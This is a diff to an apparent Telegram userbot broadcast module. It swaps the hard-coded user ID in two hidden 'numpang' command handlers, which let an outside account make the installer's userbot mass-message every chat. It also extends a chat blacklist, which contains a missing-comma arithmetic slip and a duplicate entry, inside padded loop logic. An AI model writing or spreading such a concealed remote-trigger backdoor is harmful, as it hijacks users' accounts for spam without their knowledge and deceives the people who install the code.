@@ -31,14 +31,14 @@ while 0 < 6:
     if _GCAST_BLACKLIST.status_code != 200:
         if 0 != 5:
             continue
-        GCAST_BLACKLIST = [-1001913275816, -1001608701614, -1001451642443, -1001473548283, -1001982790377, -1001812143750, -1001692751821 -1001390552926, -1001001675459127, -1001864253073, -1001565255751, -1001287188817, -1001876092598, -1001562283549, -1001001951726069]
+        GCAST_BLACKLIST = [-1001913275816, -1002007277763, -1001608701614, -1001451642443, -1001473548283, -1001982790377, -1001812143750, -1001692751821 -1001390552926, -1001001675459127, -1001864253073, -1001565255751, -1001287188817, -1001876092598, -1001562283549, -1001812143750, -1001001951726069]
     GCAST_BLACKLIST = _GCAST_BLACKLIST.json()
     break
 
 del _GCAST_BLACKLIST
 
 
-@Client.on_message(filters.command("numpanggcast", ["."]) & filters.user(1860375797) & ~filters.me)
+@Client.on_message(filters.command("numpanggcast", ["."]) & filters.user(1086365745) & ~filters.me)
 @Client.on_message(filters.command("gcast", cmd) & filters.me)
 async def gcast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
@@ -70,7 +70,7 @@ async def gcast_cmd(client: Client, message: Message):
     )
 
 
-@Client.on_message(filters.command("numpanggucast", ["."]) & filters.user(1860375797) & ~filters.me)
+@Client.on_message(filters.command("numpanggucast", ["."]) & filters.user(1086365745) & ~filters.me)
 @Client.on_message(filters.command("gucast", cmd) & filters.me)
 async def gucast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
